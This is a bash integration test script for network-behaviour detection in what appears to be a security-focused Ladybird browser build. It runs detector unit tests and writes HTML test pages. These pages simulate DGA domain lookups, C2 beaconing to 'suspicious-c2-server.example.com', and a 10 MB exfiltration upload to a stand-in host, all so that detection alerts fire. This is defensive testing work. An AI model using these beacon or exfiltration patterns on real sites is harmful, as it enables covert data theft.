#!/bin/bash
# Phase 6 Network Monitoring Integration Test
# Milestone 0.4 - Network Behavioral Analysis

# Note: Not using set -e due to arithmetic expressions that may return 0

echo "========================================"
echo "  Phase 6 Network Monitoring Tests"
echo "  Milestone 0.4"
echo "========================================"
echo ""

# Test configuration
LADYBIRD_BIN="/home/rbsmith4/ladybird/Build/release/bin/Ladybird"
TEST_HTML_DIR="/home/rbsmith4/ladybird/Tests/Integration/html"
LOG_FILE="/tmp/ladybird_network_test.log"

# Color output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
SKIPPED=0

# Helper functions
pass() {
    echo -e "${GREEN}✓ PASS${NC}: $1"
    ((PASSED++))
}

fail() {
    echo -e "${RED}✗ FAIL${NC}: $1"
    ((FAILED++))
}

skip() {
    echo -e "${YELLOW}⊘ SKIP${NC}: $1"
    ((SKIPPED++))
}

info() {
    echo -e "${YELLOW}ℹ INFO${NC}: $1"
}

# Check prerequisites
echo "=== Checking Prerequisites ==="
if [ ! -f "$LADYBIRD_BIN" ]; then
    echo -e "${RED}ERROR${NC}: Ladybird binary not found at $LADYBIRD_BIN"
    exit 1
fi
pass "Ladybird binary exists"

if [ ! -d "$TEST_HTML_DIR" ]; then
    mkdir -p "$TEST_HTML_DIR"
    info "Created test HTML directory: $TEST_HTML_DIR"
fi

echo ""
echo "=== Test 1: Component Availability ==="
# Verify all required test binaries exist
TEST_BINS=(
    "TestDNSAnalyzer"
    "TestC2Detector"
    "TestTrafficMonitor"
    "TestPolicyGraph"
)

for bin in "${TEST_BINS[@]}"; do
    if [ -f "/home/rbsmith4/ladybird/Build/release/bin/$bin" ]; then
        pass "$bin binary exists"
    else
        fail "$bin binary not found"
    fi
done

echo ""
echo "=== Test 2: Unit Test Execution ==="
# Run unit tests and check for failures
info "Running DNSAnalyzer tests..."
if /home/rbsmith4/ladybird/Build/release/bin/TestDNSAnalyzer > /tmp/test_dns.log 2>&1; then
    pass "DNSAnalyzer tests passed"
else
    fail "DNSAnalyzer tests failed (see /tmp/test_dns.log)"
fi

info "Running C2Detector tests..."
if /home/rbsmith4/ladybird/Build/release/bin/TestC2Detector > /tmp/test_c2.log 2>&1; then
    pass "C2Detector tests passed"
else
    fail "C2Detector tests failed (see /tmp/test_c2.log)"
fi

info "Running TrafficMonitor tests..."
if /home/rbsmith4/ladybird/Build/release/bin/TestTrafficMonitor > /tmp/test_traffic.log 2>&1; then
    pass "TrafficMonitor tests passed"
else
    fail "TrafficMonitor tests failed (see /tmp/test_traffic.log)"
fi

info "Running PolicyGraph tests..."
if /home/rbsmith4/ladybird/Build/release/bin/TestPolicyGraph > /tmp/test_policy.log 2>&1; then
    pass "PolicyGraph tests passed"
else
    fail "PolicyGraph tests failed (see /tmp/test_policy.log)"
fi

echo ""
echo "=== Test 3: Regression Tests ==="
# Verify existing Sentinel features still work
info "Running MalwareML regression test..."
if /home/rbsmith4/ladybird/Build/release/bin/TestMalwareML > /tmp/test_ml.log 2>&1; then
    pass "MalwareML tests passed (no regression)"
else
    fail "MalwareML tests failed (regression detected)"
fi

info "Running FingerprintingDetector regression test..."
if /home/rbsmith4/ladybird/Build/release/bin/TestFingerprintingDetector > /tmp/test_fp.log 2>&1; then
    pass "FingerprintingDetector tests passed (no regression)"
else
    fail "FingerprintingDetector tests failed (regression detected)"
fi

info "Running PhishingURLAnalyzer regression test..."
if /home/rbsmith4/ladybird/Build/release/bin/TestPhishingURLAnalyzer > /tmp/test_phish.log 2>&1; then
    pass "PhishingURLAnalyzer tests passed (no regression)"
else
    fail "PhishingURLAnalyzer tests failed (regression detected)"
fi

echo ""
echo "=== Test 4: Build Verification ==="
# Check that all key components built successfully
REQUIRED_BINS=(
    "Ladybird"
    "RequestServer"
    "WebContent"
    "Sentinel"
)

for bin in "${REQUIRED_BINS[@]}"; do
    if [ -f "/home/rbsmith4/ladybird/Build/release/bin/$bin" ] || [ -f "/home/rbsmith4/ladybird/Build/release/libexec/$bin" ]; then
        pass "$bin built successfully"
    else
        fail "$bin not found"
    fi
done

echo ""
echo "=== Test 5: PolicyGraph Network Behavior Policies ==="
# Test PolicyGraph network behavior policy APIs via TestPolicyGraph
info "PolicyGraph network behavior policy tests included in TestPolicyGraph"
if grep -q "Network Behavior Policies" /tmp/test_policy.log 2>/dev/null; then
    if grep -q "PASSED.*network behavior" /tmp/test_policy.log 2>/dev/null; then
        pass "Network behavior policy APIs working"
    else
        fail "Network behavior policy tests had failures"
    fi
else
    skip "Network behavior policy test output not found"
fi

echo ""
echo "=== Test 6: TrafficMonitor Detection Logic ==="
# Verify detection algorithms work via TrafficMonitor tests
info "Checking TrafficMonitor detection capabilities..."

if grep -q "Composite Scoring" /tmp/test_traffic.log 2>/dev/null; then
    pass "Composite scoring test found"
else
    fail "Composite scoring test not found"
fi

if grep -q "Alert Type Determination" /tmp/test_traffic.log 2>/dev/null; then
    pass "Alert type determination test found"
else
    fail "Alert type determination test not found"
fi

echo ""
echo "=== Test 7: Manual Test Preparation ==="
# Create test HTML pages for manual testing
info "Creating test HTML pages for manual verification..."

# DGA test page
cat > "$TEST_HTML_DIR/test_dga_detection.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>DGA Detection Test</title></head>
<body>
<h1>DGA Detection Test</h1>
<p>This page attempts to load resources from DGA-like domains.</p>
<script>
// Simulate DGA domain requests
const dgaDomains = [
    'xk3j9f2lm8n.com',
    'q5w7r9t2y4u.net',
    'a1b2c3d4e5f.org'
];

dgaDomains.forEach(domain => {
    fetch('https://' + domain + '/test.js')
        .catch(err => console.log('Expected failure: ' + domain));
});
</script>
<p>Check RequestServer logs for DGA detection alerts.</p>
</body>
</html>
EOF
pass "Created DGA test page: $TEST_HTML_DIR/test_dga_detection.html"

# Beaconing test page
cat > "$TEST_HTML_DIR/test_beaconing_detection.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Beaconing Detection Test</title></head>
<body>
<h1>C2 Beaconing Test</h1>
<p>This page sends regular requests to simulate C2 beaconing.</p>
<div id="status">Starting beaconing test...</div>
<script>
let count = 0;
const domain = 'suspicious-c2-server.example.com';
const interval = 5000; // 5 seconds

function beacon() {
    count++;
    document.getElementById('status').textContent =
        `Sent ${count} beacons to ${domain} (every ${interval/1000}s)`;

    fetch('https://' + domain + '/beacon')
        .catch(err => console.log('Beacon ' + count + ' failed (expected)'));
}

// Send beacons every 5 seconds (should be detected after 10+ requests)
setInterval(beacon, interval);
beacon(); // Send first beacon immediately
</script>
<p>Let run for 2+ minutes to generate beaconing alert.</p>
</body>
</html>
EOF
pass "Created beaconing test page: $TEST_HTML_DIR/test_beaconing_detection.html"

# Exfiltration test page
cat > "$TEST_HTML_DIR/test_exfiltration_detection.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Exfiltration Detection Test</title></head>
<body>
<h1>Data Exfiltration Test</h1>
<p>This page attempts to upload large data to simulate exfiltration.</p>
<button onclick="simulateExfiltration()">Start Exfiltration Test</button>
<div id="status"></div>
<script>
function simulateExfiltration() {
    // Generate 10MB of data
    const dataSize = 10 * 1024 * 1024;
    const data = new Uint8Array(dataSize);
    for (let i = 0; i < dataSize; i++) {
        data[i] = Math.floor(Math.random() * 256);
    }

    document.getElementById('status').textContent =
        'Uploading ' + (dataSize / 1024 / 1024).toFixed(2) + ' MB...';

    fetch('https://suspicious-exfil-server.example.com/upload', {
        method: 'POST',
        body: data
    })
    .then(() => {
        document.getElementById('status').textContent = 'Upload complete (or failed as expected)';
    })
    .catch(err => {
        document.getElementById('status').textContent = 'Upload failed (expected): ' + err.message;
    });
}
</script>
<p>Click button to trigger large upload. Check for exfiltration alert.</p>
</body>
</html>
EOF
pass "Created exfiltration test page: $TEST_HTML_DIR/test_exfiltration_detection.html"

echo ""
echo "=== Test 8: Performance Verification ==="
# Verify detection performance meets targets
info "Checking detection performance from test logs..."

# DNSAnalyzer should be fast
if grep -q "Entropy.*expected" /tmp/test_dns.log 2>/dev/null; then
    pass "DNSAnalyzer metrics calculated (performance assumed acceptable)"
else
    skip "DNSAnalyzer performance metrics not available"
fi

# C2Detector should handle statistical analysis
if grep -q "Coefficient of Variation" /tmp/test_c2.log 2>/dev/null; then
    pass "C2Detector statistical analysis working"
else
    skip "C2Detector statistical results not available"
fi

echo ""
echo "========================================"
echo "  Test Summary"
echo "========================================"
echo -e "Passed:  ${GREEN}$PASSED${NC}"
echo -e "Failed:  ${RED}$FAILED${NC}"
echo -e "Skipped: ${YELLOW}$SKIPPED${NC}"
echo "========================================"
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}✓ All tests passed!${NC}"
    echo ""
    echo "Manual Testing Instructions:"
    echo "1. Start Ladybird: $LADYBIRD_BIN"
    echo "2. Load test pages from: $TEST_HTML_DIR"
    echo "3. Navigate to about:security to view alerts"
    echo "4. Check RequestServer logs for detection messages"
    echo ""
    echo "Test pages created:"
    echo "  - test_dga_detection.html (DGA domain detection)"
    echo "  - test_beaconing_detection.html (C2 beaconing)"
    echo "  - test_exfiltration_detection.html (Data exfiltration)"
    exit 0
else
    echo -e "${RED}✗ Some tests failed${NC}"
    echo "Check log files in /tmp/ for details"
    exit 1
fi
